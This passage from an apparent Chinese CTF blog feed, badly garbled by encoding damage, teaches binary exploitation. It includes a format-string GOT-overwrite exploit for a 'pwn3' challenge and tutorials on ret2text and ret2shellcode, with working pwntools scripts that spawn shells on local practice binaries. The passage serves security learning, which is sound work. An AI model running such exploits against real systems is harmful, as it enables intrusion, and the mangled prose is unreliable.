20250212164940.png]]<br>è‡ªå·±è¿è¡Œä¸€ä¸‹è¿™ä¸ªç¨‹åºäº†è§£è¯¥ç¨‹åºçš„åŠŸèƒ½ï¼Œæ€»çš„æ¥è¯´è¯¥ç¨‹åºæ¨¡æ‹Ÿäº†ä¸€ä¸ªæ–‡ä»¶åˆ›å»ºè¯»å–è½¯ä»¶<h5 id="getshellæ€è·¯"><a href="#getshellæ€è·¯" class="headerlink" title="getshellæ€è·¯"></a>getshellæ€è·¯</h5>æ— ç°æˆçš„systemå’Œbin/shï¼Œå°è¯•æ³„éœ²libc<br>åŒæ—¶ï¼Œé™¤äº†ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¹‹å¤–ï¼Œå…¶ä»–åœ°æ–¹æ²¡æœ‰ä»€ä¹ˆé—®é¢˜<br>æˆ‘ä»¬å°è¯•ç”¨printfå‡½æ•°æ¥æ³„éœ²å‡½æ•°çš„çœŸå®åœ°å€<br>![[Pasted image 20250212170014.png]]<h6 id="ç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»"><a href="#ç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»" class="headerlink" title="ç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»"></a>ç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»</h6>ç®€å•é€†å‘åˆ†æå¤„å¯†ç <code>rxraclhm</code><br>![[Pasted image 20250212171550.png]]<br>ä»æ ˆä¸Šæˆ–è¾“å‡ºå‡å¯åˆ¤æ–­è¾“å…¥çš„å­—ç¬¦ä¸²åç§»ä¸º7<h6 id="æ³„éœ²putså‡½æ•°åœ°å€"><a href="#æ³„éœ²putså‡½æ•°åœ°å€" class="headerlink" title="æ³„éœ²putså‡½æ•°åœ°å€"></a>æ³„éœ²putså‡½æ•°åœ°å€</h6>å·²çŸ¥å­—ç¬¦ä¸²åç§»ä¸º7ï¼Œç„¶ååˆ©ç”¨pwntoolsçš„ELFæ¨¡å—å¯çŸ¥puts@gotçš„åœ°å€ï¼Œæ„å»ºå¦‚ä¸‹payload<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload &#x3D; &#39;%8$s&#39;+p32(puts_got)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>%sï¼šè¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå³å°†åç§»å¤„æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚%i$sè¡¨ç¤ºè¾“å‡ºåç§»iå¤„åœ°å€æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ï¼Œå¯ç”¨äºè¯»å–GOTè¡¨ç­‰ä¿¡æ¯ã€‚</li></ul></blockquote><p>æˆ‘ä»¬å°†%sæ”¾åœ¨ç¬¬7ä½ï¼Œputs@gotæ”¾åœ¨ç¬¬8ä½ï¼Œè¿™æ ·%8$så°±ä¼šæŠŠputså‡½æ•°çš„çœŸå®åœ°å€æ‰“å°å‡ºæ¥äº†ã€‚ä¸ºä»€ä¹ˆè¦è¿™æ ·å¸ƒç½®å‘¢ï¼Œå…¶å®æ˜¯ä¸ºäº†æ–¹ä¾¿æ¥æ”¶æ‰“å°å‡ºæ¥çš„å­—ç¬¦ä¸²ã€‚<strong>è¿™æ ·å¸ƒç½®åputså‡½æ•°çš„çœŸå®åœ°å€ä¼šåœ¨å‰4ä¸ªå­—èŠ‚æ‰“å‡ºæ¥ï¼Œæ‰€ä»¥åªéœ€è¦æ¥æ”¶å‰å››ä¸ªå°±å¯ä»¥äº†</strong>ã€‚</p><blockquote><p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©ï¼špayload=p32(puts_got) +â€™%7$sâ€™<br>è¿™ç§æ–¹å¼ï¼Œä¸è¿‡æ‰“å°å‡ºæ¥çš„å†…å®¹éœ€è¦ä»<strong>ç¬¬5ä¸ªå­—èŠ‚å¼€å§‹æ¥æ”¶</strong></p></blockquote><p>è¿™æ ·å³å¯å¾—åˆ°ç¨‹åºè¿è¡Œæ—¶putså‡½æ•°çš„çœŸå®åœ°å€<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">puts_addr &#x3D; u32(sh.recv()[:4])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h6 id="æ‰¾systemå‡½æ•°åœ°å€"><a href="#æ‰¾systemå‡½æ•°åœ°å€" class="headerlink" title="æ‰¾systemå‡½æ•°åœ°å€"></a>æ‰¾systemå‡½æ•°åœ°å€</h6><p>å¦‚æœæ˜¯è¿œç¨‹pwnï¼Œæˆ‘ä»¬å»æŸ¥æ‰¾ä¸€ä¸‹libcå¯¹åº”ç‰ˆæœ¬å³å¯<br>![[Pasted image 20250212172938.png]]<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&#39;)libc.address&#x3D;put_addr-libc.symbols[&#39;puts&#39;]sys_addr&#x3D;libc.symbols[&#39;system&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><h6 id="è¦†ç›–putså‡½æ•°"><a href="#è¦†ç›–putså‡½æ•°" class="headerlink" title="è¦†ç›–putså‡½æ•°"></a>è¦†ç›–putså‡½æ•°</h6><p>å‰é¢å·²ç»ç”¨è¿‡äº†puts_fileå’Œget_fileå‡½æ•°ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨show_dirå‡½æ•°<br>![[Pasted image 20250212173601.png]]<br>åŸºæœ¬æ€è·¯æ˜¯è¿™æ ·çš„ï¼š<br>å›é¡¾ä¸€ä¸‹show_dirå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„æ–‡ä»¶åå­˜æ”¾åœ¨å˜é‡sä¸­ï¼Œæœ€åä¼šä½œä¸ºputså‡½æ•°çš„å‚æ•°æ‰“å°å‡ºæ¥ã€‚<strong>é‚£ä¹ˆå¦‚æœå°†putså‡½æ•°æ›¿æ¢æˆsystemå‡½æ•°ï¼Œå¹¶ä¸”æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå«â€/bin/shâ€çš„æ–‡ä»¶åï¼Œé‚£ä¹ˆåŸæœ¬åº”è¯¥æ‰§è¡Œçš„æ˜¯puts(s)ï¼Œä½†å®é™…ä¸Šæ‰§è¡Œçš„å´æ˜¯system(â€œ/bin/shâ€)</strong><br>é‚£ä¹ˆè¦†ç›–çš„è¿‡ç¨‹ä¾ç„¶åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œè¦†ç›–ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹pwntoolsä¸­çš„ä¸€ä¸ªå‡½æ•°<br><code>fmtstr_payload</code><br>![[Pasted image 20250212181148.png]]<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload &#x3D; fmtstr_payload(7,&#123;puts_got:sys_addr&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><blockquote><p>7:è·ç¦»æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»<br>puts_got:è¢«è¦†ç›–çš„åœ°å€<br>sys_addr:è¦†ç›–çš„åœ°å€</p></blockquote><h6 id="æ‰§è¡Œdirågetshell"><a href="#æ‰§è¡Œdirågetshell" class="headerlink" title="æ‰§è¡Œdirågetshell"></a>æ‰§è¡Œdirågetshell</h6><p>è¦†ç›–åè¾“å…¥dirè°ƒç”¨show_dirå‡½æ•°ï¼ŒåŸæœ¬çš„puts(â€œ/bin/sh;â€)å°±ä¼šè½¬è€Œæ‰§è¡Œsystem(â€œ/bin/sh;â€),ç„¶åå³å¯getshell</p><h5 id="å›é¡¾æ€è·¯"><a href="#å›é¡¾æ€è·¯" class="headerlink" title="å›é¡¾æ€è·¯"></a>å›é¡¾æ€è·¯</h5><p>è¾“å…¥å¯†ç â€”&gt;è¾“å…¥putåˆ›å»ºæ–‡ä»¶â€”&gt;è¾“å…¥æ–‡ä»¶åâ€/bin/sh;â€â€”&gt;è¾“å…¥æ–‡ä»¶å†…å®¹ï¼ˆè¦†ç›–çš„payload)-&gt;è¾“å…¥getæ‰“å°æ–‡ä»¶å†…å®¹â€”&gt;è¾“å…¥è¦æ‰“å°çš„æ–‡ä»¶åâ€/bin/sh;â€œæ‰§è¡Œè¦†ç›–</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level&#x3D;&#39;debug&#39;   sh&#x3D;process(&#39;.&#x2F;pwn3&#39;)    pwn3&#x3D;ELF(&#39;.&#x2F;pwn3&#39;)  #ç™»å½•å¯†ç sh.recvuntil(&#39;nism):&#39;)sh.sendline(&#39;rxraclhm&#39;)puts_got&#x3D;pwn3.got[&#39;puts&#39;]sh.sendline(&#39;put&#39;)sh.recvuntil(&#39;upload:&#39;)sh.sendline(&#39;Zechariah&#39;)sh.recvuntil(&#39;content:&#39;)payload&#x3D;b&#39;%8$s&#39;+p32(puts_got)sh.sendline(payload)#get the address of putssh.sendline(&#39;get&#39;)sh.recvuntil(&#39;get:&#39;)sh.sendline(&#39;Zechariah&#39;)put_addr&#x3D; u32(sh.recv()[:4])libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&#39;)libc.address&#x3D;put_addr-libc.symbols[&#39;puts&#39;]sys_addr&#x3D;libc.symbols[&#39;system&#39;]#puts_got-&gt;systempayload&#x3D;fmtstr_payload(7,&#123;puts_got:sys_addr&#125;)sh.sendline(&#39;put&#39;)sh.recvuntil(&#39;upload:&#39;)#åœ¨è¿è¡Œshow_diræ—¶å°†putså˜ä¸ºsystemsh.sendline(&#39;&#x2F;bin&#x2F;sh;&#39;)sh.recvuntil(&#39;content:&#39;)sh.sendline(payload)#getæ‰§è¡Œprintfï¼Œä»¤payloadæ‰§è¡ŒæˆåŠŸsh.recvuntil(&#39;ftp&gt;&#39;)sh.sendline(&#39;get&#39;)sh.recvuntil(&#39;get:&#39;)sh.sendline(&#39;&#x2F;bin&#x2F;sh;&#39;)#é€šè¿‡dirå¼€shellsh.sendline(&#39;dir&#39;)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><em>getshell</em></strong><br>![[Pasted image 20250212204303.png]]</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNå…¥é—¨-åŸºæœ¬ROP</title>
      <link href="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/"/>
      <url>/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºæœ¬ROP"><a href="#åŸºæœ¬ROP" class="headerlink" title="åŸºæœ¬ROP"></a>åŸºæœ¬ROP</h1><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨äº†è§£æ ˆæº¢å‡ºåï¼Œæˆ‘ä»¬å†ä»åŸç†å’Œæ–¹æ³•ä¸¤æ–¹é¢æ·±å…¥ç†è§£åŸºæœ¬ROP</p><h3 id="ä»€ä¹ˆæ˜¯ROP"><a href="#ä»€ä¹ˆæ˜¯ROP" class="headerlink" title="ä»€ä¹ˆæ˜¯ROP"></a>ä»€ä¹ˆæ˜¯ROP</h3><p>ROPçš„å…¨ç§°ä¸ºReturn-oriented programmingï¼ˆè¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰ï¼Œè¿™æ˜¯ä¸€ç§é«˜çº§çš„å†…å­˜æ”»å‡»æŠ€æœ¯å¯ä»¥ç”¨æ¥ç»•è¿‡ç°ä»£æ“ä½œç³»ç»Ÿçš„å„ç§é€šç”¨é˜²å¾¡ï¼ˆæ¯”å¦‚å†…å­˜ä¸å¯æ‰§è¡Œå’Œä»£ç ç­¾åç­‰ï¼‰ã€‚<strong>é€šè¿‡ä¸Šä¸€ç¯‡æ–‡ç« æ ˆæº¢å‡ºæ¼æ´åŸç†è¯¦è§£ä¸åˆ©ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ ˆæº¢å‡ºçš„æ§åˆ¶ç‚¹æ˜¯retå¤„</strong>ï¼Œ<em>é‚£ä¹ˆROPçš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åˆ©ç”¨ä»¥retç»“å°¾çš„æŒ‡ä»¤åºåˆ—æŠŠæ ˆä¸­çš„åº”è¯¥è¿”å›EIPçš„åœ°å€æ›´æ”¹æˆæˆ‘ä»¬éœ€è¦çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</em></p><h3 id="ä¸ºä»€ä¹ˆè¦ROP"><a href="#ä¸ºä»€ä¹ˆè¦ROP" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ROP"></a>ä¸ºä»€ä¹ˆè¦ROP</h3><p>æ¢ç©¶åŸå› ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯NX(DEP)ï¼Œ<em>NXå³No-execute(ä¸å¯æ‰§è¡Œ)çš„æ„æ€ï¼ŒNX(DEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</em><br><strong>éšç€NXä¿æŠ¤çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœã€‚</strong><br>æ‰€ä»¥å°±æœ‰äº†å„ç§ç»•è¿‡åŠæ³•ï¼Œropå°±æ˜¯ä¸€ç§ã€‚</p><p>ROP(Return Oriented Programming)ï¼Œ<strong><em>å…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µï¼ˆgadgets)æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</em></strong><br><em>æ‰€è°“gadgetså°±æ˜¯ä»¥retç»“å°¾çš„æŒ‡ä»¤åºåˆ—</em>ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ä¹‹æ‰€ä»¥ç§°ä¹‹ä¸ºROPï¼Œæ˜¯å› ä¸ºæ ¸å¿ƒåœ¨äºåˆ©ç”¨äº†æŒ‡ä»¤é›†ä¸­çš„retæŒ‡ä»¤ï¼Œæ”¹å˜äº†æŒ‡ä»¤æµçš„æ‰§è¡Œé¡ºåºã€‚<br><strong>ROPæ”»å‡»ä¸€èˆ¬å¾—æ»¡è¶³å¦‚ä¸‹æ¡ä»¶</strong></p><ul><li>ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚</li><li>å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„gadgetsä»¥åŠç›¸åº”gadgetsçš„åœ°å€ã€‚<br>å¦‚æœgadgetsæ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”çš„åœ°å€ã€‚</li></ul><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a><strong>ret2text</strong></h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><strong><em>ret2textå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç (.text)</em></strong><br>å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç (ä¹Ÿå°±æ˜¯gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ROPã€‚<br>è¿™æ—¶ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“å¯¹åº”è¿”å›çš„ä»£ç çš„ä½ç½®ã€‚å½“ç„¶ç¨‹åºä¹Ÿå¯èƒ½ä¼šå¼€å¯æŸäº›ä¿æŠ¤ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å»ç»•è¿‡è¿™äº›ä¿æŠ¤ã€‚</p><blockquote><p><strong>é¡¾åæ€ä¹‰ï¼Œret2text(ret to text)ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„åˆ©ç”¨ç‚¹åœ¨åŸæ–‡ä»¶ä¸­å¯»æ‰¾ç›¸å¯¹åº”çš„ä»£ç å³å¯(è¿›ç¨‹å­˜åœ¨å±é™©å‡½æ•°å¦‚system(â€œ/binâ€)æˆ–execv(â€œ/bin/shâ€)çš„ç‰‡æ®µï¼Œå¯ä»¥ç›´æ¥åŠ«æŒè¿”å›åœ°å€åˆ°ç›®æ ‡å‡½æ•°åœ°å€ä¸Šã€‚ä»è€Œgetshellã€‚ï¼‰ï¼Œæ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç ï¼ˆ.text)</strong></p></blockquote><h3 id="åˆ©ç”¨å‰æ"><a href="#åˆ©ç”¨å‰æ" class="headerlink" title="åˆ©ç”¨å‰æ"></a>åˆ©ç”¨å‰æ</h3><p>å¼€å¯äº†NXï¼Œæ ˆä¸Šæ— æ³•å†™å…¥shellcode</p><blockquote><p><strong>shellcodeåŒ…å«system(â€œ/bin/shâ€)ç­‰ï¼Œå½“NXä¿æŠ¤å¼€å¯ï¼Œå°±è¡¨ç¤ºé¢˜ç›®ç»™äº†ä½ system(â€˜/bin/shâ€™ï¼‰ï¼Œå¦‚æœå…³é—­ï¼Œè¡¨ç¤ºä½ éœ€è¦è‡ªå·±å»æ„é€ shellcode</strong></p></blockquote><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">void test()&#123;    system(&quot;&#x2F;bin&#x2F;sh&quot;);&#125;int main()&#123;    char buf[20];    gets(buf);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ£€æŸ¥ä¸€ä¸‹æ–‡ä»¶ä¿æŠ¤<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122110045.png" alt="Pasted image 20250122110045">ä¿æŠ¤å…¨å…³<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122111413.png" alt="Pasted image 20250122111413"><br>rä»£è¡¨mainå‡½æ•°çš„æ ˆåº•ï¼Œç´§æ¥ç€å°±æ˜¯è¿”å›åœ°å€ï¼Œ<code>offset=0x8-(-0x20)=40</code><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122110827.png" alt="Pasted image 20250122110827"><br>testå‡½æ•°,å³åé—¨å‡½æ•°åœ°å€ä¸º<code>0x401132</code><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122111722.png" alt="Pasted image 20250122111722"><br>å†™ä»¥ä¸‹expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *p&#x3D;process(&quot;.&#x2F;test&quot;)offset&#x3D;40addr &#x3D; 0x401132payload&#x3D;b&#39;a&#39;* offset + p64(addr)p.sendline(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122123145.png" alt="Pasted image 20250122123145"><br>ç»“æœæœ¬åœ°æ‰“ä¸é€šï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯offsetæµ‹é‡é”™è¯¯ï¼Œäºæ˜¯å»å­¦ä¹ äº†æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦(cyclic)ï¼Œæ‰‹åŠ¨æµ‹å‡ºæ¥è¿˜æ˜¯40ï¼Œæœ€åçŒœæµ‹æ˜¯åœ°å€é—®é¢˜ï¼Œåœ¨idaä¸­æ‰¾åˆ°â€/bin/shâ€ï¼Œä¿®æ”¹addrä¸º<code>0x401136</code>ã€‚</p><p><em>æœ€åäº†è§£åˆ°ä½†å¦‚æœæ“ä½œç³»ç»Ÿæ˜¯ <strong>Ubuntu 18.04</strong> åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œå°±ä¸å¾—ä¸è€ƒè™‘ <strong>æ ˆå¯¹é½</strong> çš„é—®é¢˜ã€‚</em></p><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122122225.png" alt="Pasted image 20250122122225"></p><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250122123204.png" alt="Pasted image 20250122123204"><br><strong><em>æˆåŠŸgetshell</em></strong></p><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><strong>ret2shellcode</strong></h2><h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><strong><em>ret2shellcodeï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œ shellcode ä»£ç </em></strong>ã€‚<br><strong>ä¸€èˆ¬æ¥è¯´ï¼Œshellcode éœ€è¦æˆ‘ä»¬è‡ªå·±å¡«å……ã€‚è¿™å…¶å®æ˜¯å¦å¤–ä¸€ç§å…¸å‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œå³æ­¤æ—¶æˆ‘ä»¬éœ€è¦è‡ªå·±å»å¡«å……ä¸€äº›å¯æ‰§è¡Œçš„ä»£ç ã€‚</strong></p><blockquote><p>å³ç¨‹åºä¸­æ²¡æœ‰ç±»ä¼¼äºsystem(â€œ/bin/sh)åé—¨å‡½æ•°ï¼Œéœ€è¦è‡ªå·±å¡«å……</p></blockquote><p>åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œè¦æƒ³æ‰§è¡Œ shellcodeï¼Œéœ€è¦å¯¹åº”çš„ binary åœ¨è¿è¡Œæ—¶ï¼Œshellcode æ‰€åœ¨çš„åŒºåŸŸå…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</p><h3 id="åˆ©ç”¨å…³é”®"><a href="#åˆ©ç”¨å…³é”®" class="headerlink" title="åˆ©ç”¨å…³é”®"></a>åˆ©ç”¨å…³é”®</h3><ul><li>ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”è¿˜è¦èƒ½å¤Ÿæ§åˆ¶è¿”å›åœ°å€</li><li>ç¨‹åºè¿è¡Œæ—¶ï¼Œshellcodeæ‰€åœ¨çš„åŒºåŸŸè¦æ‹¥æœ‰æ‰§è¡Œæƒé™(NXä¿æŠ¤å…³é—­ï¼Œbssæ®µå¯æ‰§è¡Œ)</li><li>æ“ä½œç³»ç»Ÿè¿˜éœ€è¦å…³é—­ASLR(åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–)ä¿æŠ¤ã€‚(æˆ–å…³é—­PIEä¿æŠ¤)</li></ul><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><ul><li>å…ˆä½¿ç”¨cyclicæµ‹è¯•æº¢å‡ºç‚¹ï¼Œæ„é€ åˆæ­¥çš„payload</li><li>ç¡®å®šç¨‹åºä¸­çš„æº¢å‡ºä½ï¼Œçœ‹æ˜¯å¦å¯åœ¨bssæ®µä¼ å…¥æ•°æ®</li><li>ä½¿ç”¨GDBçš„<code>vmmap</code>æŸ¥çœ‹<code>bssæ®µ</code></li><li>å†å°†ç¨‹åºæº¢å‡ºåˆ°ä¸Šä¸€æ­¥ç”¨æˆ·æäº¤çš„å˜é‡çš„åœ°å€</li></ul><h3 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example">ctf-challenges/pwn/stackoverflow/ret2shellcode/ret2shellcode-example at master Â· ctf-wiki/ctf-challenges</a><br>è¿è¡Œ<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123130739.png" alt="Pasted image 20250123130739"><br>checksec<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123130542.png" alt="Pasted image 20250123130542"><br>IDAæ‰“å¼€<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123130924.png" alt="Pasted image 20250123130924"><br>å¯ä»¥çœ‹åˆ°ï¼Œæ— åé—¨å‡½æ•°ä¸”å­˜åœ¨åŸºæœ¬çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œä¸”å°†å¯¹åº”å­—ç¬¦ä¸²å¤åˆ¶åˆ°buf2å¤„</p><blockquote><p>å¯ç”¨<code>readelf -S æ–‡ä»¶å</code>æä¾›ç¨‹åºä¸­å„æ®µçš„åœ°å€èŒƒå›´<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123131052.png" alt="Pasted image 20250123131052"><br>buf2åœ¨bssæ®µï¼ŒåŠ¨è°ƒçœ‹è¯¥bssæ®µæ˜¯å¦å¯æ‰§è¡Œ<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250123131416.png" alt="Pasted image 20250123131416"><br>bssæ®µåœ¨ä»¥ä¸‹èŒƒå›´ï¼Œæ— å¯æ‰§è¡Œæƒé™(ubuntu24)<br><code>0x804a000  0x804b000 rw-p     1000   1000 /home/zechariah/æ¡Œé¢/pwn_learn/ret2shellcode</code></p></blockquote><p>åœ¨è¾ƒä½ç‰ˆæœ¬çš„kaliæˆ–linuxä¸­,åˆ™æ˜¯<br><code>rwxp</code>ï¼Œå…·æœ‰å¯æ‰§è¡Œæƒé™<br>æ¥ç€ç”¨cyclicè®¡ç®—åç§»ä¸º112<br>å¾—åˆ°å¦‚ä¸‹exp<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env pythonfrom pwn import *sh &#x3D; process(&#39;.&#x2F;ret2shellcode&#39;)shellcode &#x3D; asm(shellcraft.sh()) #ç”Ÿæˆå¹¶æ±‡ç¼–shellcodebuf2_addr &#x3D; 0x804a080sh.sendline(shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr))sh.interactive()<span aria-hidden="true" 